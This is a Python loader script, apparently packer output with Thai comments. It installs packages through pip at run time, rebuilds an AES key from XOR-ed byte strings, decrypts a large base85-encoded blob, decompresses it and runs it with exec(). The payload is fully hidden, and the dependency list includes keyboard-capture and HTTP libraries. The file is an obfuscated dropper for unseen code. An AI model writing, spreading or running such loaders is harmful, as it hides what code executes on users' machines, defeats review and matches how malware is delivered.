
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['ctypes', 'subprocess', 'keyboard', 'rich', 'datetime', 'os', 'httpx', 'ujson', 'asyncio']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'U\xb8\xab\xde\x82\xfb;\xcf\t\xe1\xe9\xdc\x05\xc4\xda\xdf%\xdfd\x8f\x82\xa6#\x82\xdf\x1e\xee\xd8EQ\xbaS', b'\\\xa2\x8a\xeagF\r?Y^\x1e_\xf1\x93f\xf5m\x7f\xb6\x93\x08\xe21m\xd9\x81]\xdc\x054\x9e.', b'\xeb\x89\x81\x88\x08]0:\x8cJc\xba\xc8\xbfc\xab\xb5\xb6\x1c,]\x82\xecu\xee\xb4\xc4\xce\x85GB~'])
_I = _xor([b'*>)!$\xc4\xd1\xa1\xea\x0bI\xc1\xf7\xc7\xc5\xa8', b'\xc8\xa1f\xcae@-\xdb!Z$ \xb3+\xbb\xcf'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('=h&7Qh^_ei#^B()YrNH_EP4+^L&dpSA99*6ts(j4g#1IC)7irGLS#|@%mCxI5E>CcrFWUXx*yxhnU5)kr$4u{Tf>A1oKnFkgKSY}G*{!WKuGq;7UcbYgE)Hk56Q;~Xr&8!VlHMs`+y|&uU}B;2JU3rarx7P^zjKH9F=yYH?Yu|V$^dF!$Z|58KIk>c$`k82I;KeNU1yFk_@1S&{KPg4s{u7`PvYvW&UEEb=q>gRA-k}dII$~?1`HL@herWX`_GqDO-R$)RBPj!WzHLT2hCLxD}xThxZ?0Wsyl<iAJrA)qlvYSBq`r7N)Yt{xLa0d}D+O-8Ids$_@nRB?pz{Ceuw+a4c0uw>#<456bvDouS|O|9JO#Ok0IGvmblT^<|vCQb&`zQw_A|cs7>`l5IG1-aQn&`}#Lk_APBdD<in5Pbe&@#xioIG{J+w_-EgYH6>i$nGfod91a*XSmm;KETNw{OdcG*fv|X_UxSq8EZ9;%eJhv;JL#kC$+8Iyz@IRkBFsKgQWSMz&xEmo5^O0%mhaK|=uOtF^$uV2y^kl>K$7Qu-ct-IfR47|4NJ)^{trB{3|CZoEpvc!*ERitbdG%_kbFUL9SqP-Au}h*7y#4Q7qjzWO$hvTaUW1@?<i+Cc1|r&08I+AAVBe*qZl9s*tw~g{=MeZuJx78Rj`a3YddJKkI5u*l$T)hheIP*&xT3`Mh{Hn^_1<&jKm(_$inYA0NkW(+$TFAUcr6r4SW%dl5ne=CsD`-Ds_rs{Nh-!^Fb-#QZ|u^LguCKFxW?$6`QS;X$Gho<lIJ1KCPe~{<fDG0p9C)PtvqO;Z=iffC7P=(~7O!gNW0ijnM@_^R9+A-pY>IH;R-Km}ga7%ZyosN_%QCEleVEP}f<UZ-%RokKL~@iX0dXIR$`}9AYvj%dmO%9c9N!0796pG(9<?+aBVK6}AUO^8ByZYKKY6;<#_EMdI5%Q=WOtTZLmO5{A(u1eJeub76M%P44&f26*3Gq?x^n2l65_PKoNLg)6o6?BS&0n=6BTr_#I^)CwNV44#zVS9qGrEY;lF^9q}<GAoQ@W~_Y*s(j539@!y!WDon4YMWg#HM$-rn+#X`dSSyn;qUuRL&Zg@r97!OC@X*HwnZ)&?|<xCtWICl7ORaDMgjUTMltPT7dAB90j5f8H@r*h2hN>j7v&kMSe6H6*$G_tG(08vz*lCjhCjOAQT7#fT!egi5T*N5enp9zSd6_|sVM`<u!DDmI<%1}^3)US5LKM}OET|BkI~WQHD7J@a|t6y1~N^IgQid0#Hqb?Lt+yT=7sm`%4}W#xrS-s#LCBea|AQWKU99(77f=FRfGZQ{=a1%Mr%=g7=eg;1B;yWdp+lwK%XnN<A1?+d_>Nx456etw7>*Yno%2fM<GE0Zepa@dlZxK1lGs^=FOE?Ky!`%V){G{0}y6=Ka$NH$#2qM<ZN`XGBfqouS_s>LXMXwc~N!n$tttxljK6xh{D_Lj~?fm_SAiF4%7VR_paLOFM21Jn`B%h1z;m00FU%SZI^3>w7T@`U{z>d6OFqc#YcR`0n0{YHD}97xyO8=^Ktp{2z!i^m51?YgN&XTq)^J6tX|5!qU@Wd#W=BL1rTcWvsEbeL@-dQp^J}#Z?Kes)Ou<fiWIW$u%K{N4RA02+9T>wg1(rx-rxy}#$2JweB;!Pu;#41VwOdG{@U_sraXx`VoMxp8x8<*q1^W`75D?(ItF#VAA-Xrwh&md52D&>s-C=L_JkO&Lof6Sm?{OAG&uZqr!ZUlEYZX%DrNQ7d(lp8i@JrEX<%WeUk_87eqnb@@;AXV@*#9F{lYEh%Q{C1goS|&`t$K@^d!U$@ij!no2vNgNQ`?xc`{M>rXOyM64ar^S5b!3KGU!uA_>n6kA-@TVngn|e}YPPQwhJ>YlIM`F*4z3GBBWTGgZS_tyk`|BPQ3@k&nJJT5P)yqlDm9pT44`v;Qivdkc%$Pd*S(UmiPLfDVk|SHjuh%EKdI$eh4gjXC!TP!VBlF$e9(H?B@r76)If^Df=8^N-vZz$Owqnif9pG_&Ouban1m_hVdd?9R_6JkF$zcMypRDq_CtFrg4c=z`M^+T3tr&JI!yW_Bq<8NLg}6yF#jGu9mguDd55n-NIWL{Y`Box65{5LAs54e`}P0q{iS1!T`y8E?4tw$V?_OCy0BZYYPwYa>0u(+UuG2ug92W^S3&r-L7FTy%S$NC5x@CWuSnk+2OBg#zwlJPpCQ3xbW!Aqwi{$nlwDhvMon82+hc^pp<yYugLbfG47jDhdi!wKhOqGQqTmE+jU=0Wh|OBicQq>x~CRzN$A@$)3=Og43h$%GODdJ}z}5es>DL0REevvckMywc9VLDA5`SOYkD3b$~h>5kZgU51P|8QeRG%p`(V>)yX!DOOF9Uad|8*&?W-oK-805TLRVuUmK1}MG+GEiiK*djuB%HD2fal;K#rKji|#(QKW;OQSkIf4i!l6SeNt1xSP<$%N27&TV;c;8{4-NB{vcb8WjOMlxi9-dC)@+kwKGep|3H$+MevNI*Fursi)+l)p|Xujtgc`8+}fhKtJ=Y#^ux&u+5B(iWo0`gj&GlpZ@EHD+2RE&emXM&)Q@qe|bANZ<ms7yPptBb2;FcVa$eC<nqtY=|9<P)th%GIW?JVYa!d_f1a83F4#23-MF|W{*%~)z>vZLM>imijwn7#=^&92-^oXFx7&&aaAL5(0}DqhPPa5hl8dyJ)OrR50BR#MN-^py;2p;ChcYsmrj1zGV}TAiF<iZ<tp=^sF*A2);qNp?u7bHhf7sL-QdW8NTIel5+HlPXM0c77t~(x5Gxfb3D?JES<p~iKVLCqX+uY`k>l|BXjE@h%1}Swdlf^kN=%+Dq5Wk!|Z{vb6REBhXrW?8^gEok-dYu3pg_cgO9lDi}h&)w)7iC0(gS893MP{N*4X>_QuDes*Ld2Ab<j3=*oV<X{a%ID$70zQ8^piwivfP|<y2Z+}iJw)(2!Osj1p>C?f4-MiJS+y<CO?f>R!`q<Q{tu%)bG@AOs~?qN!I#yXZ|yI3^WAHEPRk-2W|WvdsYr_9t!*Jk0k+tB(hx=7FjBqG9%xxQpmwahWhje*2SmI4)6pk&@0#6U9eV(1a&%?Q7~&u;u_D7s%tpzVhfi%o`mcX?CfqY2GV+#MTurroiuOuc`_^&%C0SkV_jFE6YFKBb3jD%4@>%ZG@8o;^%OGKv?u94{B+SrkQOi}gSX<RzU(}s;33s%(39HYy6<uKn9yrEq$}gjwj(XgqiFj`E3VBq4Fq<F3JyuAs!#FM`!*YMz#B})fwbvIAq#4-7CC<>!@`mR`a(J*b!jj+RqoD19Xw$yT_4+!7cA@0O$^k1ai0%yD)F)rM}3)b03=FrrQFwj>judHKU(HBl`I;iMhG9Dc~mA;Z{hEM9$M&6q}`Pi4NZ#4(s7OZ^_E_KLKYShQAx3y7pAvs+cCX0NG?-}t8$fB#ar29v|F8mtQ}7}EVh-;VM)4=R2-2(J)%0>uf0KYcuqLy!(e?}`uioTNxKm+7`;)SNJ_!vM+N^qXLX+E%Pfz>GKtKPNF=l83>Tr?pudOi&Wm~WvuS&B4(Zj2O<(FMegJf$?xjnU;Hs~*^haM9xbiTv9fE$Uh84^fMYDUG!Es-d(px`)B>Kt+ZRE_EiJ;hSH}L{OX2z*74G(Xo9KaeCd@#=(lp1FcA<*yo-~Y11L-}f1$k5JY2ugI}8tR>`MYSAmR{t>K2&(aGj0E<vrh?nc%M#}e`Aq)7lnIthMgwq5kLZK4V}HjUQB|S5ndwi?gLg`?{$1Bpm4^?@KRQ8p9@L*%09ivXD8(){LGQ<q7{?=HLb5cnQOA$bHq$axLZ?WYNg@IxL6rebQeC_9zg-s7Hz0L3a1un=<Z4dDkXK)ux$MuJYY}aY1oOxh%&5~v31kh2@&*yBasw$<z4Xf+D2pjLSrV7DElO78f{Bk$94^t$c90Rx0DxboS>|J<(ud>LJ?yOUU)@G|x$*VQYkgpPDwQZ!hNBucFxDZw?AK^M5h5=RlkV4*COp^iir8^WUJvRVwYDABVZ65UbbP3~NR!+Bvk<eFv2NK=0JeCl#b4u@4)oEQ>FG+>6sXQfC714xNJ%yw0ho5*AV^6y%R<?<)Lr-v@?iydse7=#E?#HqSCUn7p+YF$+-@VYUolC*Zh2|t1P8tn+g$wBvL)%?CigNhhGNgYx`;NWnj0&_FXgoWoJd*Kq=t-^lq;|1O9YPAwF%0G*V-{pT=##@m|YPu^KRb_0z|`am3ghW9wT?Qs0Km98ip%9YH3jkeD=&$zh&nWxglY(5@Mri$Qv=Ui;J`cDt<NpTk!`lkSRP|ncB1u+lKh;Pj;z<d}NE0{LhUpgh>k^U18~e)-<#r%mpp{K-_;1)mM-a|KT=$Jp(t*XrVn={PbUml&y~5%hbANpjtI$?-xu`jJ+xL0@HOpL<JBf^|^aR=N>V1%-E|hPwTr+VtqI+41K%5`BPvq2O8$Q9GQ++X6;*8BUtt0k7zQe({G7x!aK~i?cZ3Y%f+W26-Xmex%}1dyus@E#v*=%5@8Afry9B^l82(SYQdtGnMFs?JS4CIfEVvzYN`<!x1z%FG`NDF4X+XG8yFjQD~)C(zyd5@-o4V&FQxb<jY*yJThW-*!}E<DkY?H)L85#AuTea|;>C2MzPgKvDsH3*J^C&A=+6yZB2bd@XZ>Z?O|G~T#55zvNCmvsLc9`~5D8gEKCVtxOo!B&$7G5HH2wU15@GdI0LB<k&JEBdQw<=kdFYZojTnvkY3?DG@ZwZUh;jTuZ=iX%=<NtFp9PpenwnB2tJ%q~E{(0nJ2U+eA+pg~%nyPnJuDA3p(bz^<}YG@W~>fkGU8lI_LmqfS=snI$E%!M>LB<h^(*m=exS@Oy@IRS`ik^h^T(FORh7J`+CX~o*!x3}=wJ{6?%mdF?tkpknuOkegHz#~lsIx#z}s*tKv?|vd$IY_%`C0GxLY{G%x>;rkh7foOjteE=Ojc=IIngf?Bocq(598Xe5?zzwG1NA7l7)L@b-^A^Eg@b4EZP6%WbpGwg?_91-}N<7y4v%8Pw~rg5r{ZVS0*L&t%>bIN>4;QVg!2YR32kGc+oFmx%ut%~d<>`S|?|W>>KWgWFw%TKBcQ%8(C}lZ#<Ly_u6=89#w<h$8(@F6b9c4bd_B3rciSSIYcPB$M56Q(A7g-5h=WchzyaSLnID4hv{;nx->$=NMhfwGlQLB#1x$0gc)f28*xh%OQm`n<4KGQ~WbKt_uBDZgR%Wr?qarE0r&EdK!^o>tQf&Xp_W;<PjELLK51GTYl6T9(Hc|HcN&eJ_YHzVb>~Jf(6&i(&6)8D<sV}1*I~2tT*r@V!logB0c*JT7D8#Szh}jx?-08DycH@XlB|;!G+{2g8GFIE|22TGQ5(jEH`)1O&BJhk@;r8Jx}kjVVzWx60~IznTVDHa5v{9i$Zu1pM385H+#&*{>$!K@}|*xeY&!un`Q-KfL*T1)x@8Pc2L{k3gS#JT2%BhMa+nE&6pjwa90PBgKp{d$Jc$NpqGi8aIXfRMj6Y%MSG6-N=HqHtlM{0!8~mrz|eh5L!Fu!bQHr2=Pykhb}G|~wz*7+pX8KZ#MaSOUB}l>M6c15Ey0xenva+pg}lL@;-y-17oOShi<M2!<SZEzhZVmAZApglO5z>?*$1K@W(ILmmi0>+j%9SUwK^hb0)+WCQxFrYy>gp@PmP((?WoWDN#r-OY@GG<y`D{~#h<`n`V*f!Ypkg#8#IYbeK;qxoldjO(<RlkNA_U*9}e;9%~aRV)3~R}!p)A<qj3#qu08|PWYEPdDk7e4V0+q!n&L$v?A`;4F#Lgw$fT~cSA9@DQ_@`PD?bAM@(-L3MtY5l3t_F;liVsVa-w)q4wRjK^&m-e_H5FJQ`Zjwn%`NxfiJ)7(y^rxZ{TVi65%77{ErP?H%Q~4>Sl>{{?m8;1M$TDHV-OS_{K-fZ{>zMYr51^;3gPfL<erxsh3_-Utyu9MrlK1P>~`zi3}xQY)mEdq}oLe(v6;}tI~~kdHnY-k%_w-N-<YzaN)FRDMjmbgF`1UCzy&EY5y|ql<0R6($u@Na)&~{Kj}c%yKuc)D)C29`>EkVm;sg>JB=z4GGE9DVTn-C8*Fl`S+#@Aoya$p^H!$=*jh?>MH+eK+<|azfVKMnN@JN4!Bi<+n^Q&rQi93_^;)95Kvv1~nu~HvaTtc6=wr264h`#DdmQZ1jIua0sWxD%IMZI7J}*UoAO`0OB3WqPYOoI=v5ZXafp()auwJ!QtssbyA5%K)LW;W*%tZZF8j@7Du^D>saHo(gHz!2eU2St$)<NcPlmC_9aSkH6?K`&c;^qmif59l}y)NfZS+gPdo@y<yQSRRj@{brVHNL%6lskqO&!Y<}yBBYO1#zy+lJ^ijjMs3S7fJ=lrANZWv;sdhFAk=*Q+zolg?8R`w%v3NjI{A1mSZM={c5KtIRo1E;;!3E-(dTBlTXQ6Z5mx~MR1eB;cvFEwcrKZDpBQNW?xC?R(B=(&x--QWh(gZ&>SG3TZNN5b()%n51&^wsi41uNF|`I#%v&2y=+iH%n<a0LAw@ON{v=yQ^~lkm*)<;AO@-j!TP!ScUnqbb(q6-@g~pLr1dJ|AMqxc7v+7kt)Xt;D$sr+>(MZ8_7X3rvyhsLAgOsG&cByvr{BJt*(nFJtpXS;#pp>7=g7Evlc9v53hD|pyLci_nC1k&Zilj{5F232GVpKz{Od_He`NhUSf}JjkmZIyb+jb3JUWS+vtvH4;W#)TQIVzXrWVf4xehH)2S!q~b#S7duYwO6Kv9+||GjB0CIiz^M`bTk;*=&rO4>GYUd~S<>eCPE#ise0tXRtBFkzudv=&<4T3M$dX2;&t)75qDX>T8*s$86uUG9<rKLrzc&7g*&*X2??;YLeSLDb{Q^2{saRJQU#)<`T0Nk&(d>upa=&~bBKJR_ArdsBz&Qn#!h8pwEfDRp(}?Pge@l~*1zU~bxPR$lD5w=fV_Qktj*1)j3l|9oRyY@&OYJ6p`|!8)A1yA6n$#CNmX<BG&@ZF8v+IEjFsJOTu4Z{6tV_7CX?YCcW7aTZeZJ}i1RcO7jc9>Twczc(bk7rhc3Yaq?MMFp;P0`5FwOQ8)3dJwPZNX#80Zu#>&K5lH$osT-p#00%;RW8K3-gC1(f?tNW@2_66yd(FiL7Z}G|1VdZi$oGQ&R+|^o?u)!1&RwjFX7)Cp6G_Fexj)=$BCD~^`-4_V^at85u%ZxQY;@OQj)=fvop9Ad@O?CSR(D>LOL=~l^C0UP*yk)TSTTbv&n0XV>NiGA!GNw(?7IT$a-d_xZ&2$0;{t-AlsafcK=It++MQZ%zV>oiAT3|b*m;jQbMMvKlUVpGOj6dvX-)YIE3No^1G3tyEch~P-*0nFeL@wx2K|*`A0Nx^H95f4i<bsuo|Ex{TS;Q7Ibz!)B{m2OO_-BRu&!V>^Q=t2{0m;fx~lH<0;YTvNh+Y&mc8&!DVXkDB-yEnZKY)z}4j5sCZc#AdS|GI&zQ=&<*+uzH^#0rQcDjqB)09UvWFo+JmNig3cke;sL<c^gkr3A-uj-x!4oQD!Z#Gmkh5-&d=>?Xu~3uW7*!sW$L%t')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
